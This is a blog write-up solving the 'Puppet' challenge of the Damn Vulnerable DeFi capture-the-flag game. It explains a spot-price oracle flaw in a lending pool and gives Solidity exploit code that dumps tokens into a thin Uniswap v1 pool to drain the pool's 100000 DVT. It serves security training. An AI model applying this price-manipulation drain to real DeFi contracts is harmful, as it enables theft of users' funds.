---
title: 'Damn Vulnerable DeFi Challenge #8 Solution — Puppet'
excerpt: 'Damn Vulnerable DeFi is the war game created by @tinchoabbate to learn offensive security of DeFi smart contracts.</br></br>We start with 25 ETH and 1000 DVTs in balance and we need to drain all the Pool 100000 DVTs.'
coverImage:
  url: '/assets/blog/ethereum.jpg'
  credit:
    name: Nenad Novaković
    url: https://unsplash.com/@dvlden
date: '2022-05-23T07:00:00.000Z'
author:
  name: Emanuele Ricci
  twitter: StErMi
  picture: '/assets/blog/authors/stermi.jpeg'
ogImage:
  url: '/assets/blog/ethereum.jpg'
---

This is Part 7 of the ["Let’s play Damn Vulnerable DeFi CTF"](https://stermi.xyz/blog/lets-play-damn-vulnerable-defi) series, where I will explain how to solve each challenge.

> [Damn Vulnerable DeFi](https://www.damnvulnerabledefi.xyz/index.html) is the war game created by [@tinchoabbate](https://twitter.com/tinchoabbate) to learn offensive security of DeFi smart contracts.
> Throughout numerous challenges, you will build the skills to become a bug hunter or security auditor in the space.

## Challenge #8  —  Puppet

> There’s a huge lending pool borrowing Damn Valuable Tokens (DVTs), where you first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in liquidity.
>
> There’s a DVT market opened in an [Uniswap v1 exchange](https://docs.uniswap.org/protocol/V1/introduction), currently with 10 ETH and 10 DVT in liquidity.
>
> Starting with 25 ETH and 1000 DVTs in balance, you must steal all tokens from the lending pool.

- [See contracts](https://github.com/tinchoabbate/damn-vulnerable-defi/tree/v2.0.0/contracts/puppet)
- [Hack it](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.0.0/test/puppet/puppet.challenge.js)

## The attacker end goal

We start with 25 ETH and 1000 DVTs in balance and we need to drain all the Pool 100000 DVTs.

## Study the contracts

### `PuppetPool.sol`

The contract is compiled with Solidity ^0.8.0, this mean that is not keen to underflow/overflow attacks.

The contract is inheriting from OpenZeppelin ReentracyGuard, and is using `nonReentrant` in the `borrow` function. So, there’s no way to exploit it via a reentrancy attack.

Let’s see the three main functions implemented in the contract:

- `function borrow(uint256 borrowAmount) public payable nonReentrant` allow the user to borrow `borrowAmount` amount of token only if the user pay at least an amount of `ETH` equal to the double of the token price. If the user has paid more than requested, the difference is sent back to the user.

Inside the function there are two checks:

`require(msg.value >= depositRequired, “Not depositing enough collateral”);` that will check that you have sent at least double the amount of ether compared to the amount of token you want to borrow

`require(token.transfer(msg.sender, borrowAmount), “Transfer failed”);` that will check that the tokens borrowed have been correctly sent to the user and that the operation has not failed in the process.

- `function calculateDepositRequired(uint256 amount) public view returns (uint256)` that will calculate the amount of ETH you need to deposit given the amount of tokens you would like to borrow. Math seems to be fine, the order of operations to not incur in meth rounding error is respected.
- `function _computeOraclePrice() private view returns (uint256)` that will calculate the price of the token in the Uniswap V1 exchange DVT-ETH. This price is used by `calculateDepositRequired` to calculate the amount of ether needed to be deposited to borrow the tokens. Also here, the math seems to be fine, the order of operations to not incur in meth rounding error is respected.

Given that there are no underflow/overflow issues, reentrancy is cover and math operations for both `mul` and `div` is correctly ordered, how can we exploit this contract?

Let’s see how the price of a token is calculated. I’m going to merge and rearrange the code in both `calculateDepositRequired` and `_computeOraclePrice` to have a more clear picture:

```solidity
uint256 tokenPrice = uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
uint256 depositRequired = amount * tokenPrice * 2 / 10 ** 18
```

As you can see from the code, we can **manipulate the price of the token** from the oracle function **by manipulating the balance of the Uniswap pool**.

**The price of the token will go down as the balance of the token in the pool will go up.**

All of this is possible just because the pool has just a little liquidity compared to the amount of tokens that we own. As a result, we can manipulate the price of this specific pool.

## Solution code

Let’s look at the attacker code and explain step by step. This is just a part of the test’s code. If you want the full solution, please go to the end of the article and see the GitHub project link.

```solidity
//... imports

contract PuppetTest {

    //... setup

    function exploit() internal override {
        /** CODE YOUR EXPLOIT HERE */

        uint256 deadline = block.timestamp * 2;

        vm.startPrank(attacker);

        // Approve the exchange for the whole amount of token
        token.approve(address(uniswapExchange), type(uint256).max);

        // Sell token all the token to get ETH
        // Doing this the price of the token will lower and the Pool `_computeOraclePrice` will return a low value
        // Allowing us to borrow at a cheaper price
        uniswapExchange.tokenToEthSwapInput(token.balanceOf(attacker), 1, deadline);

        // Calculate how much we should pay to borrow a token
        uint256 ethToBorrowOneToken = lendingPool.calculateDepositRequired(1 ether);

        // Calc how much we can borrow
        uint256 tokenWeCanBorrow = (attacker.balance * 10 ** 18) / ethToBorrowOneToken;

        // Get the max borrowable tokekns from the pool
        uint256 maxTokenToBorrow = Math.min(token.balanceOf(address(lendingPool)), tokenWeCanBorrow);

        // Borrow all the token draining the pool
        lendingPool.borrow{value: attacker.balance}(maxTokenToBorrow);

        vm.stopPrank();
    }
}
```

1.  Approve the Uniswap exchange to handle all the tokens that we own (up to the infinite)
2.  Sell all the tokens that we own for some ETH. We are not interested to know how much we are going to gain, but currently we know that 1 ETH = 1 DVT. `tokenToEthSwapInput(token.balanceOf(attacker), 1, deadline)` will perform a swap saying: sell all the token and at least I want 1 ETH back (the minimum amount of `tokenOut` we expect). Make the transaction fail if it does not succeed before the specified `deadline`. After the swap, the price of the DVT token calculated by the Oracle inside the Puppet pool will drop. This will mean that for just a little ETH (the collateral) we will be able to borrow all the DVTs that are inside the pool.
3.  We calculate how much ETH as collateral we need to be able to borrow one DVT token
4.  We calculate how much token we can borrow from the pool given the amount of ETH that we have in our balance
5.  We calculate how much we can really borrow (because the pool has a limited amount of DVT token inside, and we know that it would revert if we try to borrow more than the balance)
6.  And we call `lendingPool.borrow` to borrow all the available DVTs

You can find the full solution on GitHub, looking at [PuppetTest.t.sol](https://github.com/StErMi/forge-damn-vulnerable-defi/blob/main/src/test/puppet/PuppetTest.t.sol)

If you want to try yourself locally, just execute `forge test --match-contract PuppetTest -vv`

## Further reading on Oracles and Price manipulation

- “[Smart Contract Security Guidelines #3: The Dangers of Price Oracles](https://blog.openzeppelin.com/secure-smart-contract-guidelines-the-dangers-of-price-oracles/)” by OpenZeppelin
- “[So you want to use a price oracle](https://samczsun.com/so-you-want-to-use-a-price-oracle/)” by samczsun

## Disclaimer

All Solidity code, practices and patterns in this repository are DAMN VULNERABLE and for educational purposes only.

DO NOT USE IN PRODUCTION
